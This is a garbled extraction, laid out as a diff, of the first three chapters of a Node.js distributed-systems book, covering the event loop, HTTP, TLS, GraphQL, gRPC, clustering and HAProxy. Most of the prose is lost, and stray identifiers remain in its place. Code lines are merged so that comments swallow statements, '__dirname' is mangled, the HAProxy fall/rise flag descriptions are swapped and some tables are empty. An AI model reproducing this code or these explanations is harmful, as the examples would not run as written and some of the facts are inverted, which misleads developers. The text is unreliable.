@@ -1,0 +1,3997 @@
+Distributed Systems with Node.js
+Building Enterprise-Ready Bacl<end Services
+
+
+Thomas Hunter II
+
+
+Distributed Systems with Node.js
+Building Enterprise-Ready Backend Services
+Thomas Hunter II
+
+Distributed Systems with Node.js
+Revision History for the First Edition
+
+
+Foreword
+
+Dan Shaw (@dshaw)
+Founder and CTO, NodeSource The Node.js Company
+
+Always bet on Node.js
+
+Preface
+
+
+Target Audience
+
+Goals
+
+
+Conventions Used in This Book
+Italic
+Constant width
+Constant width bold
+Constant width italic
+
+Using Code Examples
+Supplemental material (code examples, exercises, etc.) is available for download at https://github.com/tlhunter/distributed-node.
+If you have a technical question or a problem using the code examples, please send email to bookquestions@oreilly.com.
+O’Reilly Online Learning
+
+
+
+
+How to Contact Us
+Email bookquestions@oreilly.com to comment or ask technical questions about this book.
+For news and information about our books and courses, visit http://oreilly.com. Find us on Facebook: http://facebook.com/oreilly
+Follow us on Twitter: http://twitter.com/oreillymedia
+Watch us on YouTube: http://youtube.com/oreillymedia
+Acknowledgments
+Fernando Larrañaga (@xabadu)
+
+Bryan English (@bengl)
+Julián Duque (@julian_duque)
+
+Chapter 1. Why Distributed?
+
+
+  The Single-Threaded Nature of JavaScript
+
+would otherwise run forever, you’re usually greeted with a RangeError: Maximum call stack size exceeded error. When this happens you’ve reached the maximum limit of frames in the call stack.
+a() setTimeout() x() x() Example 1-1. Example of multiple JavaScript stacks
+function a() { b(); }
+function b() { c(); } function c() { /**/ }
+
+function x() { y(); }
+function y() { z(); } function z() { /**/ }
+
+setTimeout(x, 0); a();
+
+Figure 1-1. Visualization of multiple JavaScript stacks
+setTimeout() x() a() a() x() a() x() 
+SURPRISE INTERVIEW QUESTION
+Example 1-2. JavaScript timing question
+setTimeout(() => console.log('A'), 0); console.log('B');
+setTimeout(() => console.log('C'), 100); setTimeout(() => console.log('D'), 0);
+
+let i = 0;
+while (i < 1_000_000_000) { // Assume this takes ~500ms let ignore = Math.sqrt(i);
+i++;
+}
+
+console.log('E');
+ 
+cluster worker_threads child_process 
+Table 1-1. Surprise interview solution
+Log	B	E	A	D	C
+setTimeout()
+
+Quick Node.js Overview
+Figure 1-2. Visualization of sequential versus parallel I/O
+
+ Figure 1-3. The layers of Node.js
+crypto zlibExample 1-3. Node.js threads
+#!/usr/bin/env node
+const fs = require('fs'); fs.readFile('/etc/passwd', 
+(err, data) => {  if (err) throw err; console.log(data);
+});
+
+setImmediate(  () => { 
+console.log('This runs while file is being read');
+
+});
+
+/etc/passwd
+console.log('Print, then exit');
+
+setInterval(() => {
+console.log('Process will run forever');
+}, 1_000);
+
+
+.unref() .ref()Example 1-4. The common .ref() and .unref() methods
+const t1 = setTimeout(() => {}, 1_000_000);  const t2 = setTimeout(() => {}, 2_000_000); 
+// ...
+t1.unref(); 
+// ... clearTimeout(t2); 
+setTimeout() The Node.js Event Loop
+
+setTimeout() Event Loop Phases
+Poll
+Check
+setImmediate() 
+Close
+EventEmitter close net.Server close Timers
+setTimeout() setInterval() Pending
+net.Socket ECONNREFUSED process.nextTick() Figure 1-4. Notable phases of the Node.js event loop
+
+Code Example
+Example 1-5. event-loop-phases.js
+const fs = require('fs');
+
+setImmediate(() => console.log(1)); Promise.resolve().then(() => console.log(2)); process.nextTick(() => console.log(3)); fs.readFile(  filename, () => {
+console.log(4);
+setTimeout(() => console.log(5)); setImmediate(() => console.log(6)); process.nextTick(() => console.log(7));
+});
+console.log(8);
+fs setImmediate() process.nextTick() fs.readFile() 
+fs.readFile() setTimeout() setImmediate() process.nextTick() async await const sleep_st = (t) => new Promise((r) => setTimeout(r, t)); const sleep_im = () => new Promise((r) => setImmediate(r));
+
+(async () => {
+setImmediate(() => console.log(1)); console.log(2);
+await sleep_st(0);
+setImmediate(() => console.log(3)); console.log(4);
+await sleep_im();
+
+setImmediate(() => console.log(5)); console.log(6);
+await 1;
+setImmediate(() => console.log(7)); console.log(8);
+})();
+
+async await.then() setImmediate(() => console.log(1)); console.log(2);
+Promise.resolve().then(() => setTimeout(() => { setImmediate(() => console.log(3)); console.log(4);
+Promise.resolve().then(() => setImmediate(() => { setImmediate(() => console.log(5)); console.log(6);
+Promise.resolve().then(() => { setImmediate(() => console.log(7)); console.log(8);
+});
+}));
+}, 0));
+
+setTimeout() setImmediate() Event Loop Tips
+
+setImmediate() process.nextTick()RangeErrorconst nt_recursive = () => process.nextTick(nt_recursive); nt_recursive(); // setInterval will never run
+
+const si_recursive = () => setImmediate(si_recursive); si_recursive(); // setInterval will run
+
+setInterval(() => console.log('hi'), 10);
+
+setInterval() nt_recursive() si_recursive() setImmediate() // Antipattern
+
+function foo(count, callback) { if (count <= 0) {
+return callback(new TypeError('count > 0'));
+}
+myAsyncOperation(count, callback);
+}
+
+count count function foo(count, callback) { if (count <= 0) {
+return process.nextTick(() => callback(new TypeError('count > 0')));
+}
+myAsyncOperation(count, callback);
+}
+
+setImmediate() process.nextTick() let bar = false; foo(3, () => {
+assert(bar);
+});
+bar = true;
+
+bar Sample Applications
+
+http Service Relationship
+Figure 1-5. The relationship between web-api and recipe-api
+
+
+$ npm init -y
+
+npm install Producer Service
+Example 1-6. recipe-api/producer-http-basic.js
+
+#!/usr/bin/env node
+
+// npm install fastify@3.2
+const server = require('fastify')();
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;
+console.log(`worker pid=${process.pid}`); server.get('/recipes/:id', async (req, reply) => {
+console.log(`worker request pid=${process.pid}`); const id = Number(req.params.id);
+if (id !== 42) { reply.statusCode = 404;
+return { error: 'not_found' };
+}
+return {
+producer_pid: process.pid, recipe: {
+id, name: "Chicken Tikka Masala", steps: "Throw it in a pot...", ingredients: [
+{ id: 1, name: "Chicken", quantity: "1 lb", },
+{ id: 2, name: "Sauce", quantity: "2 cups", }
+]
+}
+};
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Producer running at http://${HOST}:${PORT}`);
+});
+
+
+ $ node recipe-api/producer-http-basic.js # terminal 1
+
+$ curl http://127.0.0.1:4000/recipes/42  # terminal 2
+
+{
+"producer_pid": 25765, "recipe": {
+"id": 42,
+"name": "Chicken Tikka Masala", "steps": "Throw it in a pot...", "ingredients": [
+{ "id": 1, "name": "Chicken", "quantity": "1 lb" },
+{ "id": 2, "name": "Sauce", "quantity": "2 cups" }
+]
+}
+}
+
+Consumer Service
+Example 1-7. web-api/consumer-http-basic.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2 node-fetch@2.6 const server = require('fastify')(); const fetch = require('node-fetch');
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 3000;
+const TARGET = process.env.TARGET || 'localhost:4000';
+
+server.get('/', async () => {
+const req = await fetch(`http://${TARGET}/recipes/42`); const producer_data = await req.json();
+
+return {
+consumer_pid: process.pid, producer_data
+};
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Consumer running at http://${HOST}:${PORT}/`);
+});
+$ node web-api/consumer-http-basic.js # terminal 1
+$ curl http://127.0.0.1:3000/	# terminal 2
+
+{
+"consumer_pid": 25670, "producer_data": {
+"producer_pid": 25765, "recipe": {
+...
+}
+}
+}
+
+pid Even a multithreaded application is constrained by the limitations of a single machine.
+1	“Userland” is a term borrowed from operating systems, meaning the space outside of the kernel where a user’s applications can run. In the case of Node.js programs, it refers to application code and npm packages—basically, everything not built into Node.js.
+2	A “tick” refers to a complete pass through the event loop. Confusingly, setImmediate() takes a tick to run, whereas process.nextTick() is more immediate, so the two functions deserve a name swap.
+3	In a real-world scenario, any shared files should be checked in via source control or loaded as an outside dependency via an npm package.
+
+4	Many of the examples in this book require you two run multiple processes, with some acting as clients and some as servers. For this reason, you’ll often need to run processes in separate terminal windows. In general, if you run a command and it doesn’t immediately exit, it probably requires a dedicated terminal.
+
+Chapter 2. Protocols
+
+
+
+Table 2-1. The OSI layers
+
+Layer	Name	Example
+8	User	JSON, gRPC
+7	Application	HTTP, WebSocket
+6	Presentation	MIME, ASCII, TLS
+5	Session	Sockets
+4	Transport	TCP, UDP
+3	Network	IP, ICMP
+2	Data Link	MAC, LLC
+1	Physical	Ethernet, IEEE 802.11
+Request and Response with HTTP
+
+HTTP Payloads
+Example 2-1. Node.js request code
+#!/usr/bin/env node
+
+// npm install node-fetch@2.6
+const fetch = require('node-fetch');
+
+(async() => {
+const req = await fetch('http://localhost:3002/data', {
+
+method: 'POST', headers: {
+'Content-Type': 'application/json',
+'User-Agent': `nodejs/${process.version}`, 'Accept': 'application/json'
+},
+body: JSON.stringify({ foo: 'bar'
+})
+});
+const payload = await req.json(); console.log(payload);
+})();
+Example 2-2. HTTP request
+POST /data HTTP/1.1 
+Content-Type: application/json  User-Agent: nodejs/v14.8.0 Accept: application/json
+Content-Length: 13
+Accept-Encoding: gzip,deflate Connection: close
+Host: localhost:3002
+
+{"foo":"bar"} 
+\r\n
+Example 2-3. HTTP response
+HTTP/1.1 403 Forbidden  Server: nginx/1.16.0 
+Date: Tue, 29 Oct 2019 15:29:31 GMT
+Content-Type: application/json; charset=utf-8 Content-Length: 33
+Connection: keep-alive Cache-Control: no-cache Vary: accept-encoding
+
+{"error":"must_be_authenticated"} 
+HTTP Semantics
+HTTP methods
+POSTGETPATCHDELETEIdempotency
+GETPATCHDELETE 
+Status codes
+Table 2-2. HTTP status code ranges
+
+Range	Type	Examples
+100–199	Information	101 Switching Protocols
+200–299	Success	200 OK, 201 Created
+300–399	Redirect	301 Moved Permanently
+400–499	Client error	401 Unauthorized, 404 Not Found
+500–599	Server error	500 Internal Server Error, 502 Bad Gateway
+Client versus server errors
+
+Response caching
+GET Expires Statelessness
+lscdls Cookie HTTP Compression
+Accept-Encoding
+
+Content-Encoding: br  require Example 2-4. server-gzip.js
+#!/usr/bin/env node
+
+// Adapted from https://nodejs.org/api/zlib.html
+// Warning: Not as efficient as using a Reverse Proxy const zlib = require('zlib');
+const http = require('http'); const fs = require('fs');
+
+http.createServer((request, response) => {
+const raw = fs.createReadStream(  dirname + '/index.html'); const acceptEncoding = request.headers['accept-encoding'] || ''; response.setHeader('Content-Type', 'text/plain'); console.log(acceptEncoding);
+
+if (acceptEncoding.includes('gzip')) { console.log('encoding with gzip'); response.setHeader('Content-Encoding', 'gzip');
+
+raw.pipe(zlib.createGzip()).pipe(response);
+} else {
+console.log('no encoding'); raw.pipe(response);
+}
+}).listen(process.env.PORT || 1337);
+$ echo "<html><title>Hello World</title></html>" >> index.html
+$ node server-gzip.js
+
+# Request uncompressed content
+$ curl http://localhost:1337/
+# Request compressed content and view binary representation
+$ curl -H 'Accept-Encoding: gzip' http://localhost:1337/ | xxd # Request compressed content and decompress
+$ curl -H 'Accept-Encoding: gzip' http://localhost:1337/ | gunzip
+
+curl Example 2-5. Comparing compressed versus uncompressed requests
+$ curl http://localhost:1337/ | wc -c
+$ curl -H 'Accept-Encoding: gzip' http://localhost:1337/ | wc -c
+echo 
+Content-Length HTTPS / TLS
+
+localhost Example 2-6. Generating a self-signed certificate
+$ mkdir -p ./{recipe-api,shared}/tls
+$ openssl req -nodes -new -x509 \
+-keyout recipe-api/tls/basic-private-key.key \
+-out shared/tls/basic-certificate.cert
+This command creates two files, namely basic-private-key.key (the private key) and basic-certificate.cert (the public key).
+Next, copy the recipe-api/producer-http-basic.js service that you made in Example 1-6 to a new file named recipe-api/producer-https-basic.js to resemble Example 2-7. This is an HTTPS server built entirely with Node.js.
+Example 2-7. recipe-api/producer-https-basic.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2
+// Warning: Not as efficient as using a Reverse Proxy const fs = require('fs');
+const server = require('fastify')({ https: { 
+key: fs.readFileSync(  dirname+'/tls/basic-private-key.key'),
+cert: fs.readFileSync(  dirname+'/../shared/tls/basic-certificate.cert'),
+}
+});
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;
+
+server.get('/recipes/:id', async (req, reply) => { const id = Number(req.params.id);
+if (id !== 42) { reply.statusCode = 404;
+return { error: 'not_found' };
+}
+return {
+producer_pid: process.pid,
+
+recipe: {
+id, name: "Chicken Tikka Masala", steps: "Throw it in a pot...", ingredients: [
+{ id: 1, name: "Chicken", quantity: "1 lb", },
+{ id: 2, name: "Sauce", quantity: "2 cups", }
+]
+}
+};
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Producer running at https://${HOST}:${PORT}`);
+});
+$ node recipe-api/producer-https-basic.js	# terminal 1
+$ curl --insecure https://localhost:4000/recipes/42 # terminal 2
+
+--insecure http https rejectUnauthorized: false 
+signed by another one called IdenTrust DST Root CA X3. The three certificates form a chain of trust (see Figure 2-1 for a visualization of this).
+Figure 2-1. The certificate chain of trust
+ca: certContent Example 2-8. web-api/consumer-https-basic.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2 node-fetch@2.6
+// Warning: Not as efficient as using a Reverse Proxy
+
+const server = require('fastify')(); const fetch = require('node-fetch'); const https = require('https'); const fs = require('fs');
+const HOST = '127.0.0.1';
+const PORT = process.env.PORT || 3000;
+const TARGET = process.env.TARGET || 'localhost:4000';
+
+const options = {
+agent: new https.Agent({ 
+ca: fs.readFileSync(  dirname+'/../shared/tls/basic-certificate.cert'),
+})
+};
+
+server.get('/', async () => {
+const req = await fetch(`https://${TARGET}/recipes/42`, options);
+const payload = await req.json();
+
+return {
+consumer_pid: process.pid, producer_data: payload
+};
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Consumer running at http://${HOST}:${PORT}/`);
+});
+$ node web-api/consumer-https-basic.js # terminal 1
+$ curl http://localhost:3000/	# terminal 2
+
+The curl command talks to web-api using HTTP, and web-api then talks to
+recipe-api using HTTPS.
+
+Example 2-9. How to be your own Certificate Authority
+# Happens once for the CA
+$ openssl genrsa -des3 -out ca-private-key.key 2048 
+$ openssl req -x509 -new -nodes -key ca-private-key.key \
+-sha256 -days 365 -out shared/tls/ca-certificate.cert 
+
+# Happens for each new certificate
+$ openssl genrsa -out recipe-api/tls/producer-private-key.key 2048 
+$ openssl req -new -key recipe-api/tls/producer-private-key.key \
+-out recipe-api/tls/producer.csr 
+$ openssl x509 -req -in recipe-api/tls/producer.csr \
+-CA shared/tls/ca-certificate.cert \
+-CAkey ca-private-key.key -CAcreateserial \
+-out shared/tls/producer-certificate.cert -days 365 -sha256 
+CSR: Generate a private key ca-private-key.key for the Certificate Authority.
+CSR: Generate a root cert shared/tls/ca-certificate.cert (this will be provided to clients). You’ll get asked a lot of questions, but they don’t matter for this example.
+APP: Generate a private key producer-private-key.key for a particular service.
+localhost CSR: Generate a service certificate producer-certificate.cert signed by the
+
+Now modify the code in web-api/consumer-https-basic.js to load the ca- certificate.cert file. Also modify recipe-api/producer-https-basic.js to load both the producer-private-key.key and producer-certificate.cert files. Restart both servers and run the following command again:
+$ curl http://localhost:3000/
+
+You should get a successful response, even though web-api wasn’t aware of the recipe-api service’s exact certificate; it gains its trust from the root ca- certificate.cert certificate instead.
+JSON over HTTP
+
+Content-Type: application/json ?limit=10&starting_after=20has_more ?per_page=10&page=3Link The Dangers of Serializing POJOs
+JSON.stringify(obj)
+toJSON() User toJSON() const user1 = { username: 'pojo',
+email: 'pojo@example.org'
+};
+class User { constructor(username, email) {
+this.username = username; this.email = email;
+}
+toJSON() {
+return {
+username: this.username, email: this.email,
+};
+}
+}
+const user2 = new User('class', 'class@example.org');
+// ...
+res.send(user1); // POJO res.send(user2); // Class Instance
+
+{"username":"pojo","email":"pojo@example.org"}
+{"username":"class","email":"class@example.org"}
+
+password 
+user.password = valueuser1.password = user2.password = 'hunter2';
+// ... res.send(user1); res.send(user2);
+
+{"username":"pojo","email":"pojo@example.org","password":"hunter2"}
+{"username":"class","email":"class@example.org"}
+
+username emailpassword API Facade with GraphQL
+POST 
+GraphQL Schema
+String IntExample 2-10. shared/graphql-schema.gql
+type Query {  recipe(id: ID): Recipe pid: Int
+}
+type Recipe {  id: ID!
+name: String! steps: String
+ingredients: [Ingredient]! 
+}
+type Ingredient { id: ID!
+name: String! quantity: String
+}
+Recipe Recipe Ingredient ingredientsQuerypid recipe
+Recipe recipe idRecipe Table 2-3. GraphQL scalars
+
+Name	Examples	JSON equivalent
+
+Int	10, 0, -1	Number
+
+Float	1, -1.0	Number
+
+String	“Hello, friend!\n”	String
+
+Boolean	true, false	Boolean
+
+ID	“42”, “975dbe93”	String
+Recipe id ID! Recipe name steps StringingredientsIngredient Ingredient Queries and Responses
+
+pid {
+pid
+}
+
+{
+"data": { "pid": 9372
+}
+}
+
+datadata
+errors Query {
+recipe(id: 42) { name ingredients {
+name quantity
+}
+}
+}
+
+id name id steps name quantity {
+"data": {
+"recipe": {
+"name": "Chicken Tikka Masala", "ingredients": [
+{ "name": "Chicken", "quantity": "1 lb" },
+{ "name": "Sauce", "quantity": "2 cups" }
+]
+}
+}
+}
+
+graphql graphql fastify-gql graphql GraphQL Producer
+
+Example 2- 1. recipe-api/producer-graphql.js
+#!/usr/bin/env node
+// npm install fastify@3.2 fastify-gql@5.3 const server = require('fastify')();
+const graphql = require('fastify-gql'); const fs = require('fs');
+const schema = fs.readFileSync( dirname + '/../shared/graphql-schema.gql').toString(); 
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;
+
+const resolvers = {  Query: { 
+pid: () => process.pid,
+recipe: async (_obj, {id}) => {
+if (id != 42) throw new Error(`recipe ${id} not found`); return {
+id, name: "Chicken Tikka Masala", steps: "Throw it in a pot...",
+}
+}
+},
+Recipe: { 
+ingredients: async (obj) => { return (obj.id != 42) ? [] : [
+{ id: 1, name: "Chicken", quantity: "1 lb", },
+{ id: 2, name: "Sauce", quantity: "2 cups", }
+]
+}
+}
+};
+
+server
+.register(graphql, { schema, resolvers, graphiql: true }) 
+.listen(PORT, HOST, () => {
+console.log(`Producer running at http://${HOST}:${PORT}/graphql`);
+});
+graphql resolvers graphql Query Recipe Recipe server.register() fastify-gql 
+server.register /graphql resolvers graphiql at http://localhost:4000/graphiql. Ideally, you’d never set that value to true for a service running in production.
+resolvers Query Recipe async resolvers.Query.recipe recipe() id Recipe
+id Recipe Recipe idnamestepsingredients ingredients resolvers.Recipe recipe() serves
+id name resolvers recipe() ingredientsresolvers.Recipe.ingredients Recipe recipe() idnamesteps id id Ingredient GraphQL Consumer
+
+Example 2-12. web-api/consumer-graphql.js
+#!/usr/bin/env node
+// npm install fastify@3.2 node-fetch@2.6 const server = require('fastify')(); const fetch = require('node-fetch'); const HOST = '127.0.0.1';
+const PORT = process.env.PORT || 3000;
+const TARGET = process.env.TARGET || 'localhost:4000'; const complex_query = `query kitchenSink ($id:ID) { 
+recipe(id: $id) { id name ingredients {
+name quantity
+}
+}
+pid
+}`;
+
+server.get('/', async () => {
+const req = await fetch(`http://${TARGET}/graphql`, { method: 'POST',
+headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ 
+query: complex_query, variables: { id: "42" }
+}),
+});
+return {
+consumer_pid: process.pid, producer_data: await req.json()
+};
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Consumer running at http://${HOST}:${PORT}/`);
+});
+POST query variables 
+complex_query kitchenSink$id recipe() variables $$ node recipe-api/producer-graphql.js # terminal 1
+$ node web-api/consumer-graphql.js	# terminal 2
+$ curl http://localhost:3000	# terminal 3
+
+{
+"consumer_pid": 20827, "producer_data": {
+"data": {
+"recipe": { "id": "42",
+"name": "Chicken Tikka Masala", "ingredients": [
+{ "name": "Chicken", "quantity": "1 lb" },
+{ "name": "Sauce", "quantity": "2 cups" }
+]
+},
+"pid": 20842
+}
+}
+}
+
+
+RPC with gRPC
+POST /invoiceemail POST /invoice create_invoice() 
+Protocol Buffers
+.proto Example 2-13. shared/grpc-recipe.proto
+syntax = "proto3"; package recipe;
+service RecipeService { 
+rpc GetRecipe(RecipeRequest) returns (Recipe) {} rpc GetMetaData(Empty) returns (Meta) {}
+}
+message Recipe { int32 id = 1;  string name = 2; string steps = 3;
+repeated Ingredient ingredients = 4; 
+}
+message Ingredient { int32 id = 1; string name = 2;
+string quantity = 3;
+}
+message RecipeRequest { int32 id = 1;
+}
+message Meta {  int32 pid = 2;
+
+}
+message Empty {}
+RecipeServiceMetaid Recipe ingredientsIntint32Table 2-4. Common gRPC scalars
+
+Name	Examples	Node/JS equivalent
+
+double	1.1	
+Number
+
+float	1.1	
+Number
+
+int32	-2_147_483_648	
+Number
+
+int64	9_223_372_036_854_775_808	
+Number
+
+bool	true, false	
+Boolean
+
+string	“Hello, friend!\n”	
+String
+
+bytes	binary data	
+Buffer
+
+repeated Ingredient id quantity {"id":123,"code":456} 01230456
+
+id codeIngredient idnamequantity substitute
+
+EventEmitter gRPC Producer
+@ Example 2-14. recipe-api/producer-grpc.js
+#!/usr/bin/env node
+
+// npm install @grpc/grpc-js@1.1 @grpc/proto-loader@0.5 const grpc = require('@grpc/grpc-js');
+const loader = require('@grpc/proto-loader'); const pkg_def = loader.loadSync( dirname +
+'/../shared/grpc-recipe.proto'); 
+const recipe = grpc.loadPackageDefinition(pkg_def).recipe; const HOST = process.env.HOST || '127.0.0.1';
+const PORT = process.env.PORT || 4000; const server = new grpc.Server();
+server.addService(recipe.RecipeService.service, {  getMetaData: (_call, cb) => { 
+cb(null, {
+pid: process.pid,
+});
+},
+getRecipe: (call, cb) => { 
+
+if (call.request.id !== 42) {
+return cb(new Error(`unknown recipe ${call.request.id}`));
+}
+cb(null, {
+id: 42, name: "Chicken Tikka Masala", steps: "Throw it in a pot...", ingredients: [
+{ id: 1, name: "Chicken", quantity: "1 lb", },
+{ id: 2, name: "Sauce", quantity: "2 cups", }
+]
+});
+},
+});
+
+server.bindAsync(`${HOST}:${PORT}`, grpc.ServerCredentials.createInsecure(),  (err, port) => {
+if (err) throw err; server.start();
+console.log(`Producer running at http://${HOST}:${port}/`);
+});
+GetMetaData(Empty) getRecipe() call.requestgetMetaData() http://localhost:4000/recipe.RecipeService/GetMetaData
+
+
+gRPC Consumer
+@grpc/grpc-js util.promisify() Example 2-15. web-api/consumer-grpc.js
+#!/usr/bin/env node
+
+// npm install @grpc/grpc-js@1.1 @grpc/proto-loader@0.5 fastify@3.2 const util = require('util');
+const grpc = require('@grpc/grpc-js'); const server = require('fastify')();
+const loader = require('@grpc/proto-loader'); const pkg_def = loader.loadSync( dirname +
+'/../shared/grpc-recipe.proto'); 
+const recipe = grpc.loadPackageDefinition(pkg_def).recipe; const HOST = '127.0.0.1';
+const PORT = process.env.PORT || 3000;
+const TARGET = process.env.TARGET || 'localhost:4000';
+
+const client = new recipe.RecipeService(  TARGET,
+grpc.credentials.createInsecure() 
+);
+const getMetaData = util.promisify(client.getMetaData.bind(client)); const getRecipe = util.promisify(client.getRecipe.bind(client));
+
+server.get('/', async () => {
+const [meta, recipe] = await Promise.all([ getMetaData({}), 
+getRecipe({id: 42}), 
+]);
+
+return {
+consumer_pid: process.pid, producer_data: meta, recipe
+};
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Consumer running at http://${HOST}:${PORT}/`);
+
+});
+
+
+
+
+
+
+
+
+recipe.RecipeService
+GetMetaData() Empty GetRecipe() RecipeRequest 
+@grpc/grpc-js .proto getMetaData()$ node recipe-api/producer-grpc.js # terminal 1
+$ node web-api/consumer-grpc.js	# terminal 2
+$ curl http://localhost:3000/	# terminal 3
+
+{
+"consumer_pid": 23786, "producer_data": { "pid": 23766 }, "recipe": {
+"id": 42, "name": "Chicken Tikka Masala", "steps": "Throw it in a pot...",
+
+"ingredients": [
+{ "id": 1, "name": "Chicken", "quantity": "1 lb" },
+{ "id": 2, "name": "Sauce", "quantity": "2 cups" }
+]
+}
+}
+
+recipe Recipe ingredientsRecipe ALTERNATIVES TO PROTOBUFS AND GRPC
+
+1 These code examples take many shortcuts to remain terse. For example, always favor path.join()
+over manual string concatenation when generating paths.
+
+Chapter 3. Scaling
+
+
+The Cluster Module
+cluster child_process fork()  
+cluster  http cluster if A Simple Example
+Example 3-1. recipe-api/producer-http-basic-master.js
+#!/usr/bin/env node
+const cluster = require('cluster');  console.log(`master pid=${process.pid}`); cluster.setupMaster({
+exec:   dirname+'/producer-http-basic.js' 
+});
+cluster.fork();  cluster.fork();
+
+cluster
+.on('disconnect', (worker) => {  console.log('disconnect', worker.id);
+})
+.on('exit', (worker, code, signal) => { console.log('exit', worker.id, code, signal);
+// cluster.fork(); 
+})
+.on('listening', (worker, {address, port}) => {
+
+console.log('listening', worker.id, `${address}:${port}`);
+});
+cluster filenamecluster.fork() cluster cluster 0 
+Figure 3-1. Master-worker relationships with cluster
+No changes need to be made to basic stateless applications that serve as the worker—the recipe-api/producer-http-basic.js code will work just fine.2 Now it’s time to make a few requests to the server. This time, execute the recipe- api/producer-http-basic-master.js file instead of the recipe-api/producer-http- basic.js file. In the output you should see some messages resembling the following:
+master pid=7649
+Producer running at http://127.0.0.1:4000 Producer running at http://127.0.0.1:4000 listening 1 127.0.0.1:4000
+listening 2 127.0.0.1:4000
+
+<PID> $ brew install pstree # if using macOS
+$ pstree <PID> -p -a
+
+node,7649 ./master.js
+├─node,7656 server.js
+│	├─{node},15233
+│	├─{node},15234
+│	├─{node},15235
+│	├─{node},15236
+│	├─{node},15237
+│	└─{node},15243
+├─node,7657 server.js
+│	├─ ... Six total children like above ...
+│	└─{node},15244
+├─ ... Six total children like above ...
+└─{node},15230
+
+./master.jsserver.js{node}Request Dispatching
+
+$ curl http://localhost:4000/recipes/42 # run three times
+
+worker request pid=7656 worker request pid=7657 worker request pid=7656
+
+listening $ kill <pid>
+
+kill 7656disconnect exit disconnect 1
+exit 1 null SIGTERM
+
+$ curl http://localhost:4000/recipes/42 # run three times
+
+kill disconnect exit cluster.fork() exit
+
+kill Cluster Shortcomings
+cluster cluster 
+producer_data.pid cluster producer_data.pid cluster t3.small clusterExample 3-2. cluster-fibonacci.js
+
+#!/usr/bin/env node
+
+// npm install fastify@3.2
+const server = require('fastify')();
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;
+console.log(`worker pid=${process.pid}`); server.get('/:limit', async (req, reply) => { 
+return String(fibonacci(Number(req.params.limit)));
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Producer running at http://${HOST}:${PORT}`);
+});
+
+function fibonacci(limit) {  let prev = 1n, next = 0n, swap; while (limit) {
+swap = prev;
+prev = prev + next; next = swap;
+limit--;
+}
+return next;
+}
+/<limit>limit fibonacci() The same Example 3-1 code can be used for acting as the cluster master. Re- create the content from the cluster master example and place it in a master- fibonacci.js file next to cluster-fibonacci.js. Then, update it so that it’s loading cluster-fibonacci.js, instead of producer-http-basic.js.
+$ npm install -g autocannon@6	# terminal 1
+$ node master-fibonacci.js	# terminal 1
+$ autocannon -c 2 http://127.0.0.1:4000/100000 # terminal 2
+
+Table 3-1. Fibonacci cluster with multiple cores
+Statistic	Result
+
+
+autocannon Table 3-2. Fibonacci single process
+Statistic	Result
+
+
+taskset 
+# Linux-only command:
+$ taskset -cp 0 <pid> # run for master, worker 1, worker 2
+
+autocannon Table 3-3. Fibonacci cluster with single core
+Statistic	Result
+
+
+cluster cluster Reverse Proxies with HAProxy
+
+api1.example.org api9.example.orgapi.example.org 
+Figure 3-2. Reverse proxies intercept incoming network traffic
+cluster Introduction to HAProxy
+
+Example 3-3. haproxy/stats.cfg
+frontend inbound  mode http 
+bind localhost:8000 stats enable 
+stats uri /admin?stats
+frontend inbound:8000$ haproxy -f haproxy/stats.cfg
+
+http://localhost:8000/admin?stats
+
+
+Load Balancing and Health Checks
+
+Figure 3-3. Load balancing with HAProxy
+Example 3-4. web-api/consumer-http-healthendpoint.js (truncated)
+server.get('/health', async () => { console.log('health check'); return 'OK';
+});
+haproxy/load-balance.cfg and add the content from Example 3-5 to it.
+Example 3-5. haproxy/load-balance.cfg
+defaults  mode http
+timeout connect 5000ms  timeout client 50000ms timeout server 50000ms
+
+frontend inbound
+bind localhost:3000 default_backend web-api  stats enable
+stats uri /admin?stats
+
+backend web-api 
+option httpchk GET /health 
+server web-api-1 localhost:3001 check  server web-api-2 localhost:3002 check
+defaults 
+GET /health check :3001 :3002:3000cluster  host:port
+$ node recipe-api/producer-http-basic.js
+$ PORT=3001 node web-api/consumer-http-healthendpoint.js
+$ PORT=3002 node web-api/consumer-http-healthendpoint.js
+$ haproxy -f ./haproxy/load-balance.cfg
+
+$ curl http://localhost:3000/ # run several times
+
+curl consumer_pid producer_pid single recipe-api instance is running.
+
+Open up the HAProxy statistics page again4 by visiting http://localhost:3000/admin?stats. You should now see two sections in the output: one for the inbound frontend and one for the new web-api backend. In the web-api section, you should see the two different server instances listed.
+Table 3-4. Truncated HAProxy stats
+
+	Sessions total	Bytes out	LastChk
+web-api-1	6	2,262	L7OK/200 in 1ms
+web-api-2	5	1,885	L7OK/200 in 0ms
+Backend	11	4,147	
+curl 
+curl consumer_pid CONSUMER_PID $ kill <CONSUMER_PID> \
+&& curl http://localhost:3000/ \ && curl http://localhost:3000/
+
+flag value check server server ... check inter 10s fall 4Table 3-5. HAProxy health check flags
+Flag	Type  Default Description
+
+
+fall	int	3	Consecutive healthy checks before being UP
+
+rise	int	2	Consecutive unhealthy checks before being DOWN
+
+Compression
+Example 3-6. haproxy/compression.cfg
+defaults mode http
+timeout connect 5000ms timeout client 50000ms timeout server 50000ms
+
+frontend inbound
+bind localhost:3000 default_backend web-api
+
+backend web-api compression offload  compression algo gzip 
+compression type application/json text/plain  server web-api-1 localhost:3001
+Accept-Encoding Content-Type Content-Type application/jsontext/plain
+Accept-Encoding $ node recipe-api/producer-http-basic.js
+$ PORT=3001 node web-api/consumer-http-basic.js
+$ haproxy -f haproxy/compression.cfg
+$ curl http://localhost:3000/
+$ curl -H 'Accept-Encoding: gzip' http://localhost:3000/ | gunzip
+
+TLS Termination
